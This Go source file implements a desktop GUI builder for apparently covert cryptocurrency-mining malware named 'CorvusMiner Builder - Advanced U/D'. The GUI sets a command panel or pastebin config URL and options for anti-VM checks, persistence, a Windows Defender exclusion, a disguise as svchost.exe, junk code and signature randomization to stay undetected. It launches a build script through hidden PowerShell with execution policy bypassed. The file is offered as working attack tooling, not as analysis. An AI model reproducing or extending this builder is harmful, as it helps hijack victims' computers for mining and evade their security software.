package main

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

// ─── Config ─────────────────────────────────────────────────────────────────
type BuildConfig struct {
	PanelURL          string `json:"panel_url"`
	ConfigURL         string `json:"config_url"`
	AntiVM            bool   `json:"antivm"`
	Persistence       bool   `json:"persistence"`
	DebugConsole      bool   `json:"debug_console"`
	AdminManifest     bool   `json:"admin_manifest"`
	DefenderExclusion bool   `json:"defender_exclusion"`
	CPUMiner          bool   `json:"cpu_miner"`
	GPUMiner          bool   `json:"gpu_miner"`
	RemoteMiners      bool   `json:"remote_miners"`

	// Advanced Stealth & Obfuscation
	StartupDelay    int    `json:"startup_delay"`
	FakeProcessName string `json:"fake_process_name"`
	JunkLevel       int    `json:"junk_level"`
	RandomizeSig    bool   `json:"randomize_sig"`
	ObfuscationLevel int   `json:"obfuscation_level"`
}

// ─── Profile store ───────────────────────────────────────────────────────────
type ProfileStore struct {
	mu       sync.Mutex
	profiles map[string]BuildConfig
	path     string
}

func newProfileStore(path string) *ProfileStore {
	s := &ProfileStore{path: path, profiles: make(map[string]BuildConfig)}
	s.load()
	return s
}

func (s *ProfileStore) load() {
	data, _ := os.ReadFile(s.path)
	_ = json.Unmarshal(data, &s.profiles)
}

func (s *ProfileStore) save() {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, _ := json.MarshalIndent(s.profiles, "", " ")
	_ = os.WriteFile(s.path, data, 0600)
}

func (s *ProfileStore) Names() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	names := make([]string, 0, len(s.profiles))
	for k := range s.profiles {
		names = append(names, k)
	}
	return names
}

func (s *ProfileStore) Get(name string) (BuildConfig, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	c, ok := s.profiles[name]
	return c, ok
}

func (s *ProfileStore) Set(name string, c BuildConfig) {
	s.mu.Lock()
	s.profiles[name] = c
	s.mu.Unlock()
	s.save()
}

func (s *ProfileStore) Delete(name string) {
	s.mu.Lock()
	delete(s.profiles, name)
	s.mu.Unlock()
	s.save()
}

func findProjectRoot() string {
	exe, err := os.Executable()
	if err != nil {
		cwd, _ := os.Getwd()
		return cwd
	}
	return filepath.Dir(exe)
}

func timestamp() string {
	return time.Now().Format("15:04:05")
}

func boolStr(b bool) string {
	if b {
		return "$true"
	}
	return "$false"
}

// ─── Build runner ────────────────────────────────────────────────────────────
func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
	buildScript := filepath.Join(projectRoot, "build.ps1")
	if _, err := os.Stat(buildScript); err != nil {
		output(fmt.Sprintf("ERROR: build script not found at %s\n", buildScript))
		return false
	}

	args := fmt.Sprintf(
		"& '%s' -panel_url '%s' -config_url '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s -startup_delay %d -fake_process '%s' -junk_level %d -randomize_sig %s",
		buildScript,
		cfg.PanelURL,
		cfg.ConfigURL,
		boolStr(cfg.AntiVM),
		boolStr(cfg.Persistence),
		boolStr(cfg.DebugConsole),
		boolStr(cfg.AdminManifest),
		boolStr(cfg.DefenderExclusion),
		boolStr(cfg.CPUMiner),
		boolStr(cfg.GPUMiner),
		boolStr(cfg.RemoteMiners),
		cfg.StartupDelay,
		cfg.FakeProcessName,
		cfg.JunkLevel,
		boolStr(cfg.RandomizeSig),
	)

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", args)
	cmd.Dir = projectRoot
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		output(fmt.Sprintf("ERROR: %v\n", err))
		return false
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		output(fmt.Sprintf("ERROR: %v\n", err))
		return false
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		output(scanner.Text() + "\n")
	}
	return cmd.Wait() == nil
}

// ─── UI helpers ──────────────────────────────────────────────────────────────
func labeled(label string, w fyne.CanvasObject) *fyne.Container {
	lbl := widget.NewLabelWithStyle(label, fyne.TextAlignLeading, fyne.TextStyle{Bold: true})
	return container.NewBorder(nil, nil, lbl, nil, w)
}

func hint(text string) *widget.Label {
	l := widget.NewLabelWithStyle(text, fyne.TextAlignLeading, fyne.TextStyle{Italic: true})
	l.Wrapping = fyne.TextWrapWord
	return l
}

func separator() *widget.Separator {
	return widget.NewSeparator()
}

// ─── Main ────────────────────────────────────────────────────────────────────
func main() {
	projectRoot := findProjectRoot()
	profiles := newProfileStore(filepath.Join(projectRoot, "build_profiles.json"))

	a := app.New()
	a.Settings().SetTheme(theme.DarkTheme())
	w := a.NewWindow("CorvusMiner Builder - Advanced U/D")
	w.Resize(fyne.NewSize(1220, 860))
	w.SetMaster()

	var outputScroll *container.Scroll
	var outputBuf strings.Builder
	outputEntry := widget.NewMultiLineEntry()
	outputEntry.Wrapping = fyne.TextWrapOff
	outputEntry.TextStyle = fyne.TextStyle{Monospace: true}

	appendOutput := func(text string) {
		atBottom := true
		if outputScroll != nil {
			maxScroll := outputEntry.MinSize().Height - outputScroll.Size().Height
			if maxScroll > 20 && outputScroll.Offset.Y < maxScroll-20 {
				atBottom = false
			}
		}
		outputBuf.WriteString(text)
		newText := outputBuf.String()
		outputEntry.SetText(newText)
		if outputScroll != nil && atBottom {
			outputEntry.CursorRow = strings.Count(newText, "\n")
			outputEntry.CursorColumn = 0
			outputEntry.Refresh()
			outputScroll.ScrollToBottom()
		}
	}

	// ── Build config inputs ─────────────────────────────────────────────────
	panelURLEntry := widget.NewEntry()
	panelURLEntry.SetPlaceHolder("https://panel.example.com/api/miners/submit")
	configURLEntry := widget.NewEntry()
	configURLEntry.SetPlaceHolder("https://pastebin.com/raw/YOUR_ID")

	chkAntiVM := widget.NewCheck("Anti-VM Detection", nil)
	chkPersistence := widget.NewCheck("Persistence", nil)
	chkDebugConsole := widget.NewCheck("Debug Console", nil)
	chkAdminManifest := widget.NewCheck("Admin Manifest", nil)
	chkDefenderExclusion := widget.NewCheck("Defender Exclusion", nil)
	chkCPUMiner := widget.NewCheck("CPU Miner", nil)
	chkCPUMiner.SetChecked(true)
	chkGPUMiner := widget.NewCheck("GPU Miner", nil)
	chkRemoteMiners := widget.NewCheck("Remote Miners", nil)
	minerInfoLabel := hint("Choose either Panel URL or Config GET URL above, then select miners.")

	// Advanced Stealth & Obfuscation
	delaySlider := widget.NewSlider(0, 45)
	delaySlider.Value = 25
	delayLabel := widget.NewLabel("Startup Delay: 25s")

	fakeProcEntry := widget.NewEntry()
	fakeProcEntry.SetPlaceHolder("svchost.exe")

	junkSlider := widget.NewSlider(0, 3)
	junkSlider.Value = 2
	junkLabel := widget.NewLabel("Junk Level: 2")

	chkRandomSig := widget.NewCheck("Signature Randomization (UD)", nil)
	chkRandomSig.SetChecked(true)

	delaySlider.OnChanged = func(v float64) { delayLabel.SetText(fmt.Sprintf("Startup Delay: %ds", int(v))) }
	junkSlider.OnChanged = func(v float64) { junkLabel.SetText(fmt.Sprintf("Junk Level: %d", int(v))) }

	getConfig := func() BuildConfig {
		return BuildConfig{
			PanelURL:          strings.TrimSpace(panelURLEntry.Text),
			ConfigURL:         strings.TrimSpace(configURLEntry.Text),
			AntiVM:            chkAntiVM.Checked,
			Persistence:       chkPersistence.Checked,
			DebugConsole:      chkDebugConsole.Checked,
			AdminManifest:     chkAdminManifest.Checked,
			DefenderExclusion: chkDefenderExclusion.Checked,
			CPUMiner:          chkCPUMiner.Checked,
			GPUMiner:          chkGPUMiner.Checked,
			RemoteMiners:      chkRemoteMiners.Checked,
			StartupDelay:      int(delaySlider.Value),
			FakeProcessName:   strings.TrimSpace(fakeProcEntry.Text),
			JunkLevel:         int(junkSlider.Value),
			RandomizeSig:      chkRandomSig.Checked,
		}
	}

	applyConfig := func(cfg BuildConfig) {
		panelURLEntry.SetText(cfg.PanelURL)
		configURLEntry.SetText(cfg.ConfigURL)
		chkAntiVM.SetChecked(cfg.AntiVM)
		chkPersistence.SetChecked(cfg.Persistence)
		chkDebugConsole.SetChecked(cfg.DebugConsole)
		chkAdminManifest.SetChecked(cfg.AdminManifest)
		chkDefenderExclusion.SetChecked(cfg.DefenderExclusion)
		chkCPUMiner.SetChecked(cfg.CPUMiner)
		chkGPUMiner.SetChecked(cfg.GPUMiner)
		chkRemoteMiners.SetChecked(cfg.RemoteMiners)

		delaySlider.Value = float64(cfg.StartupDelay)
		fakeProcEntry.SetText(cfg.FakeProcessName)
		junkSlider.Value = float64(cfg.JunkLevel)
		chkRandomSig.SetChecked(cfg.RandomizeSig)

		delayLabel.SetText(fmt.Sprintf("Startup Delay: %ds", cfg.StartupDelay))
		junkLabel.SetText(fmt.Sprintf("Junk Level: %d", cfg.JunkLevel))
	}

	// Profile management
	profileSelect := widget.NewSelect(profiles.Names(), nil)
	loadProfileBtn := widget.NewButton("Load", func() {
		name := profileSelect.Selected
		if name == "" {
			return
		}
		if cfg, ok := profiles.Get(name); ok {
			applyConfig(cfg)
			appendOutput(fmt.Sprintf("[%s] Loaded profile: %s\n", timestamp(), name))
		}
	})

	saveProfileBtn := widget.NewButton("Save As", func() {
		nameEntry := widget.NewEntry()
		nameEntry.SetPlaceHolder("Profile name")
		dialog.ShowForm("Save Profile", "Save", "Cancel",
			[]*widget.FormItem{widget.NewFormItem("Name", nameEntry)},
			func(ok bool) {
				if !ok || strings.TrimSpace(nameEntry.Text) == "" {
					return
				}
				name := strings.TrimSpace(nameEntry.Text)
				profiles.Set(name, getConfig())
				profileSelect.Options = profiles.Names()
				profileSelect.Refresh()
				appendOutput(fmt.Sprintf("[%s] Saved profile: %s\n", timestamp(), name))
			}, w)
	})

	deleteProfileBtn := widget.NewButton("Delete", func() {
		name := profileSelect.Selected
		if name == "" {
			return
		}
		dialog.ShowConfirm("Delete Profile", fmt.Sprintf("Delete profile '%s'?", name), func(ok bool) {
			if !ok {
				return
			}
			profiles.Delete(name)
			profileSelect.Options = profiles.Names()
			profileSelect.SetSelected("")
			profileSelect.Refresh()
			appendOutput(fmt.Sprintf("[%s] Deleted profile: %s\n", timestamp(), name))
		}, w)
	})

	profileRow := container.NewHBox(profileSelect, loadProfileBtn, saveProfileBtn, deleteProfileBtn)

	// Build button
	buildBtn := widget.NewButton("BUILD NOW", nil)
	buildBtn.Importance = widget.HighImportance
	buildBtn.OnTapped = func() {
		cfg := getConfig()
		if cfg.PanelURL == "" && cfg.ConfigURL == "" {
			dialog.ShowError(fmt.Errorf("Zadej Panel URL nebo Config URL"), w)
			return
		}

		outputBuf.Reset()
		outputEntry.SetText("")
		buildBtn.Disable()

		appendOutput(fmt.Sprintf("[%s] Starting enhanced build...\n", timestamp()))

		go func() {
			success := runBuild(projectRoot, cfg, appendOutput)
			if success {
				appendOutput(fmt.Sprintf("[%s] Build completed successfully!\n", timestamp()))
			} else {
				appendOutput(fmt.Sprintf("[%s] Build failed!\n", timestamp()))
			}
			buildBtn.Enable()
		}()
	}

	// Layout
	connectionFrame := widget.NewCard("Connection Settings", "", container.NewVBox(
		hint("⚠ Use EITHER Panel URL OR Config URL"),
		labeled("Panel URL:", panelURLEntry),
		labeled("Config GET URL:", configURLEntry),
	))

	featuresFrame := widget.NewCard("Core Features", "", container.NewVBox(
		container.NewHBox(chkAntiVM, chkPersistence),
		container.NewHBox(chkDebugConsole, chkAdminManifest),
		chkDefenderExclusion,
	))

	minerFrame := widget.NewCard("Miner Configuration", "", container.NewVBox(
		container.NewHBox(chkCPUMiner, chkGPUMiner),
		chkRemoteMiners,
		minerInfoLabel,
	))

	obfuscationFrame := widget.NewCard("Advanced Obfuscation & Stealth", "", container.NewVBox(
		container.NewHBox(delayLabel, delaySlider),
		labeled("Fake Process Name:", fakeProcEntry),
		container.NewHBox(junkLabel, junkSlider),
		chkRandomSig,
	))

	profileFrame := widget.NewCard("Build Profile", "", profileRow)

	actionRow := container.NewHBox(buildBtn, widget.NewButton("Clear Output", func() {
		outputBuf.Reset()
		outputEntry.SetText("")
	}))

	leftPanel := container.NewVBox(
		widget.NewLabelWithStyle("CorvusMiner Builder - Advanced U/D", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		profileFrame,
		connectionFrame,
		featuresFrame,
		minerFrame,
		obfuscationFrame,
		actionRow,
	)

	leftScroll := container.NewVScroll(leftPanel)
	rightPanel := container.NewBorder(
		widget.NewLabelWithStyle("Build Output", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		nil, nil, nil,
		container.NewScroll(outputEntry),
	)

	split := container.NewHSplit(leftScroll, rightPanel)
	split.SetOffset(0.45)

	w.SetContent(split)
	w.ShowAndRun()
}
